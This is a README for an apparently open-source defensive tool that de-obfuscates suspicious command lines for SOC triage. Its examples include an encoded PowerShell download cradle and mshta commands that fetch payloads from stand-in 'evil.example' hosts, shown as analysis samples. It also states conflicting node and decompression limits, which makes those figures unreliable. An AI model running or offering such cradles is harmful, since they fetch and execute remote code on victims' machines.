<div align="center">

# 🛡️ cmd-unmask

**Static Command-Line De-Obfuscation & Behavioral Triage Tracer Script**

[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
[![Dependencies: Zero (Stdlib)](https://img.shields.io/badge/dependencies-zero%20(stdlib)-009688.svg)](#)
[![Tests](https://img.shields.io/badge/tests-42%20passed-success.svg)](#)

[Install](#installation) · [Usage](#usage) · [How it works](#how-it-works) · [Limitations](#limitations)

</div>

**cmd-unmask** is an open-source static command-line de-obfuscation and behavioral triage Tracer Script designed for cyber defense teams, SOC analysts, and detection engineers. It peels multi-layered command-line obfuscation (`cmd.exe` / PowerShell / Bash), extracts and defangs Indicators of Compromise (IOCs), maps suspicious execution patterns to MITRE ATT&CK, and generates ready-to-paste SOC ticket notes in milliseconds—100% static, offline, and zero-dependency.

---

## ⚡ The 5-Second Pitch (Before vs. After)

**1. What lands in your QRadar / Wazuh / SentinelOne Offense:**
```powershell
p^o^w^e^r^s^h^e^l^l.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUAOgA4ADAAOAAwAC8AcwB0AGEAZwBlAC4AcABzADEAJwApAA==
```

**2. What `cmd-unmask -p --copy-note` puts on your clipboard in milliseconds:**
```text
[SOC TRIAGE NOTE - clipboard]
Verdict       : CRITICAL (Risk Score: 100/100)
Obfuscation   : Shell Normalizer -> Base64 UTF-16LE Decoded
Raw Command   : p^o^w^e^r^s^h^e^l^l.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAB... (276 chars total)
Unmasked Cmd  :
  powershell.exe -NoP -W Hidden -c IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')
Extracted IOCs:
  - [URL] hxxp://c2[.]evil[.]example[:]8080/stage.ps1
  - [DOMAIN] c2[.]evil[.]example
MITRE ATT&CK  :
  - T1027.010 : Command Obfuscation (Shell/Expression Layer) (Defense Evasion)
  - T1140 : Deobfuscate/Decode Payload Layer (Defense Evasion)
  - T1059.001 : PowerShell Suspicious Execution / Cradle (Execution)
  - T1105 : Ingress Tool Transfer / Remote Download Cradle (Command and Control)
```

---

## 🎯 Why `cmd-unmask`?

During live L1/L2 alert triage, every minute spent manually baking CyberChef recipes or fixing broken Base64 padding slows down containment. Existing workflows force trade-offs between speed, safety, and accuracy:

| Capability | `cmd-unmask` | Manual CyberChef Tabs | Naive Regex Scripts | Dynamic Sandbox / `eval` |
| :--- | :--- | :--- | :--- | :--- |
| **Multi-Layer Interleaving** (`^` + `-enc` + `Gzip` + `-f`) | **Automatic BFS DAG** | Manual recipe chaining | Fails on nested layers | Unpacks only if executed |
| **Data Sovereignty / Air-Gap Safe** | **100% Offline CLI** | Browser tab / copy-paste risk | Local | Often cloud-hosted |
| **Execution Safety on Analyst Host** | **100% Static (Zero `eval`)** | Safe | Safe | **High risk if run locally** |
| **Workstation CLI Argument Safety** | **Native `-p` Clipboard Mode** | N/A | Blocked by local AMSI/EDR | Blocked by local AMSI/EDR |
| **`.NET` Namespace False-Positive Suppression** | **Contextual IOC Gate** | Extracts `[Net.WebClient]` as domain | Massive False Positives | N/A |
| **SOC Offense Ticket Formatting** | **Instant (`--copy-note`)** | Manual typing & defanging | Raw text dump | Heavy PDF/JSON report |
| **Runtime Dependencies** | **Zero (Python 3 Stdlib)** | Browser required | Varies (`pip` bloat) | Heavy VM / Docker stack |

## ✨ Key Features

- 🔄 **Two-Pass Shell Normalization**: Strips `cmd.exe` carets (`^`), empty quotes (`""`), `%var:~offset,len%` slices, and PowerShell backticks (`` ` ``) without corrupting quoted literals.
- 🧩 **Static Expression Folding**: Resolves PowerShell format operators (`-f`), `[char]` casts, `-join`, `.Replace()` / `-replace`, string concatenation, and Bash ANSI-C quoting (`$'\x..'`).
- 🌲 **Bounded Interleaved Unpacking DAG**: Explores nested payloads via BFS (`max_depth=10`, `max_nodes=32`) decoding Base64, Gzip, Deflate (32MB ceiling), Hex, URL, CharCode, and gated XOR.
- 🛡️ **Contextual IOC Extraction & Defanging**: Full-DAG harvesting of URLs, domains, IPs, file paths, and hashes with `.NET` namespace false-positive suppression and automatic defanging.
- 🎯 **MITRE ATT&CK Behavioral Scoring**: Dual-stage risk scoring (0–100) mapping unmasked payloads and LOLBins (`certutil`, `mshta`, `rundll32`, `wmic`, `bits`) to MITRE techniques.
- 📋 **Frictionless Clipboard & Batch Ingestion**: Direct OS clipboard triage (`-p`, `--copy-note`), interactive TTY prompt, and automated SIEM log parsing (JSON, JSONL, text).
- 🪶 **Zero External Dependencies**: Built 100% on Python standard library (`>= 3.10`), offline and air-gap safe with strictly zero dynamic execution (`eval`/`exec`).

---

<a id="installation"></a>
## 📦 Installation

`cmd-unmask` requires Python `>= 3.10` and installs with **zero external dependencies** (100% Python standard library).

### From Git URL

```bash
pip install git+https://github.com/VelkaRepo/cmd-unmask.git
```

### From Source

```bash
git clone https://github.com/VelkaRepo/cmd-unmask.git
cd cmd-unmask
pip install -e .
```

---

<a id="usage"></a>
## 🚀 CLI Usage

### CLI Options

| Flag | Argument | Description | Default |
| :--- | :--- | :--- | :--- |
| `-c`, `--cmd` | `TEXT` | Single obfuscated command string to unmask | None |
| `-f`, `--file` | `PATH` | Path to raw text, JSON, or JSONL input file | None |
| `-p`, `--paste` | — | Read obfuscated command directly from OS clipboard | `False` |
| `--field` | `NAME` | Custom JSON field name containing the command line | Auto-detect |
| `--format` | `CHOICE` | Output format (`pretty`, `markdown`, `json`, `jsonl`) | `pretty` |
| `--copy-note` | — | Copy the Ready-to-Paste SOC Ticket Note to the OS clipboard | `False` |
| `--no-color` | — | Disable ANSI colors in pretty terminal output | `False` |
| `--no-defang` | — | Emit raw IOCs instead of defanged IOCs | `False` |
| `--max-depth` | `INT` | Maximum Unpacking DAG recursion depth | `10` |
| `--timeout` | `FLOAT` | Per-command unpacking timeout in seconds | `3.0` |
| `--fail-on` | `SEV` | Exit code 2 if severity meets or exceeds `LOW`, `MEDIUM`, `HIGH`, `CRITICAL` | None |
| `-h`, `--help` | — | Show CLI help message and exit | — |

### 1. Clipboard & Interactive Mode (Avoids Local CLI Inspection Blocks)
Passing raw malicious stagers directly as command-line arguments (`-c "powershell -enc ..."`) often triggers local Windows Defender / SentinelOne CLI blocks (`Access is denied`). Ingesting directly from the OS clipboard avoids exposing the payload in the process argument list. Copy the alert command from your SIEM and run:

```bash
# Read obfuscated command from OS clipboard, print full analysis, and copy the SOC Ticket Note back to clipboard
cmd-unmask -p --copy-note

# Or launch interactive mode (paste at prompt, or press Enter to read from clipboard)
cmd-unmask
```

### 2. Single Command & Standard Input
```bash
# Analyze a single command string (defaults to --format pretty)
cmd-unmask -c "powershell -c ('{1}{0}' -f 'Client','Net.Web')"

# Disable ANSI color codes or emit raw (undefanged) IOCs
cmd-unmask -c "mshta.exe http%3A%2F%2Fevil.example%2Fpayload.hta" --no-color --no-defang

# Pipe from stdin and emit structured JSON
echo "mshta.exe http%3A%2F%2Fevil.example%2Fpayload.hta" | cmd-unmask --format json
```

### 3. Batch SIEM & EDR Ingestion
`cmd-unmask` natively ingests raw line-delimited text files, JSON arrays, and JSONL exports from **QRadar, Wazuh, SentinelOne, FortiGate, and ArcSight**. It auto-detects standard command-line fields (`CommandLine`, `command_line`, `cmd`, `process.command_line`, `data.win.eventdata.commandLine`, `payload`), unescapes outer JSON wrapper quotes (`\"` -> `"`), and isolates malformed records so a corrupt log line never crashes a batch run:

```bash
# Batch-triage a JSONL export from Wazuh or SentinelOne and emit JSONL verdicts
cmd-unmask -f alerts.jsonl --format jsonl > triaged_alerts.jsonl

# Specify a custom JSON key and enforce a CI/SOAR severity exit gate (exit code 2 on HIGH or CRITICAL)
cmd-unmask -f qradar_offense.json --field CustomProcessCmd --fail-on HIGH
```

---

## 🖥️ Live Terminal Output

<!-- demo.gif goes here after recording -->

By default (`--format pretty`), `cmd-unmask` renders a 4-part operator view with human-readable transformation steps and a borderless Section `[4]` designed for direct terminal highlight-and-copy.

See the complete [Live Terminal Output Example](docs/architecture.md#live-terminal-output) in [`docs/architecture.md`](docs/architecture.md).

---

<a id="how-it-works"></a>
## 🏗️ Architecture & Design Decisions

`cmd-unmask` processes commands through a deterministic 4-pillar pipeline: Ingestion Pipeline & Shell Normalization, Bounded Interleaved Unpacking DAG & Expression Resolution, Full-DAG Contextual IOC Extraction & Defanging, and MITRE ATT&CK Behavioral Classification.

See the complete [Four-Pillar Architecture Diagram](docs/architecture.md#four-pillar-architecture) in [`docs/architecture.md`](docs/architecture.md).

### Domain Glossary & Architecture Decision Records (ADRs)
- **Ubiquitous Language**: [`GLOSSARY.md`](GLOSSARY.md) defines canonical domain terms (`Tracer Script`, `Ingestion Pipeline`, `Unpacking DAG`, `Payload Node`, `Detection Rigidity`, `Primary Unmasked Payload`, `Defanged IOC`, `Triage Verdict`).
- **Architecture Decision Records (`docs/adr/`)**:
  - [ADR-0001: Static Standard-Library-Only Analysis with Zero Dynamic Execution](docs/adr/0001-static-stdlib-only-analysis.md)
  - [ADR-0002: Quote-Aware Two-Pass Shell Normalizer](docs/adr/0002-quote-aware-two-pass-shell-normalizer.md)
  - [ADR-0003: Bounded Unpacking DAG with Pruning Gates and Padding-Tolerant Base64](docs/adr/0003-bounded-unpacking-dag-and-pruning-gates.md)
  - [ADR-0004: Case-Aware Bottom-Up Static Expression Resolver](docs/adr/0004-case-aware-static-expression-resolver.md)
  - [ADR-0005: Full-DAG IOC Harvesting and Dual-Stage Behavioral Intent Scoring](docs/adr/0005-full-dag-ioc-harvesting-and-intent-scoring.md)
  - [ADR-0006: Interleaved Node Processing Cycle and Deterministic Primary Leaf Ranking](docs/adr/0006-interleaved-node-processing-and-leaf-ranking.md)
  - [ADR-0007: Contextual IOC Validation to Suppress Namespace and Hex-Blob False Positives](docs/adr/0007-contextual-ioc-false-positive-suppression.md)
  - [ADR-0008: Operator UX, Win32 Clipboard Ingestion, and Layer-by-Layer Timeline Rendering](docs/adr/0008-operator-ux-clipboard-ingestion-and-timeline-rendering.md)

---

<a id="limitations"></a>
## ⚠️ Limitations

While `cmd-unmask` is engineered for high detection rigidity and deep static unpacking, several architectural trade-offs apply:

- **100% Static Analysis Only**: `cmd-unmask` never executes untrusted code, spawns child shells, or calls dynamic evaluators (`eval()` / `exec()`). Commands that depend on live network responses, remote C2 stagers, or runtime host state cannot be dynamically completed ([ADR-0001](docs/adr/0001-static-stdlib-only-analysis.md)).
- **Runtime-Built Payloads Unresolved**: Payloads assembled through complex runtime logic, JIT compilation, or programmatic variable assembly requiring an active PowerShell/Bash interpreter are not dynamically evaluated.
- **Single-Byte XOR Only**: Heuristic XOR brute-forcing is restricted to single-byte keys (`0x01`–`0xFF`) gated by entropy and anchor thresholds. Multi-byte XOR keys or stream ciphers are not recovered unless the key or operator is explicitly present in the static command syntax ([ADR-0003](docs/adr/0003-bounded-unpacking-dag-and-pruning-gates.md)).
- **Bounded Unpacking DAG**: To prevent resource exhaustion, the Unpacking DAG enforces deterministic bounds: maximum depth of 10 (`max_depth = 10`), maximum of 64 nodes (`max_nodes = 64`), and a 3.0-second per-command timeout ([ADR-0003](docs/adr/0003-bounded-unpacking-dag-and-pruning-gates.md), [ADR-0006](docs/adr/0006-interleaved-node-processing-and-leaf-ranking.md)).
- **Decompression Ceiling**: Gzip and Deflate streams enforce a strict 256 KB chunked decompression limit (`max_stream_bytes = 262,144`) to protect analyst endpoints against zip-bombs ([ADR-0003](docs/adr/0003-bounded-unpacking-dag-and-pruning-gates.md)).

---

## 🧪 Verification & Test Suite

Run the full unit and integration test suite (42 tests covering DOSfuscation, expression folding, multi-layer DAG unpacking, zip-bomb ceilings, IOC false-positive suppression, MITRE classification, and CLI UX) via Python's built-in `unittest` discovery:

```bash
python -m unittest discover -s tests -v
```
